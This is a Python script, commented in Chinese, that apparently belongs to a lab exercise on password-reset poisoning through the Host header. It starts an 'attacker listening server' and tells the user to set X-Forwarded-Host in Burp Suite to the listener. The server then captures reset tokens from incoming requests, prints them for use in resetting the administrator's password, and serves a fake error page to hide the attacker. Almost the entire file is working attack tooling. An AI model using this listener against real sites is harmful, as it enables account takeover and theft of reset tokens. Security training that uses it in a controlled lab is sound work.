import http.server
import socketserver
import sys
from urllib.parse import unquote

# 配置监听端口
PORT = 8888

class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # 1. 记录并打印请求详情
        print(f"\n[+] 收到来自 {self.client_address[0]} 的请求!")
        print(f"    请求路径: {self.path}")
        print(f"    Host 头: {self.headers.get('Host')}")
        
        # 2. 尝试提取 Token
        if "token=" in self.path:
            try:
                token = self.path.split("token=")[1].split("&")[0]
                print(f"\n    ★ 成功捕获 Token ★ : {token}")
                print(f"    现在你可以使用这个 Token 去重置管理员密码了！")
            except:
                pass
        
        # 3. 返回 200 OK，模拟正常服务器响应
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>404 Not Found</h1><p>(Fake generic error page to hide attacker identity)</p>")

    def log_message(self, format, *args):
        # 禁用默认的访问日志，避免刷屏
        return

def run_server():
    print(f"""
==================================================
   [ 攻击者监听服务器 ]
   监听端口: {PORT}
   使用方法: 
   1. 在 Burp Suite 中修改请求头:
      X-Forwarded-Host: 127.0.0.1:{PORT}
   2. 等待受害者（模拟脚本）点击链接
==================================================
    """)
    try:
        with socketserver.TCPServer(("", PORT), AttackerHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
    except OSError as e:
        print(f"\n[!] 端口 {PORT} 被占用，请检查是否已经运行了该脚本，或修改脚本中的 PORT 变量。")

if __name__ == "__main__":
    run_server()
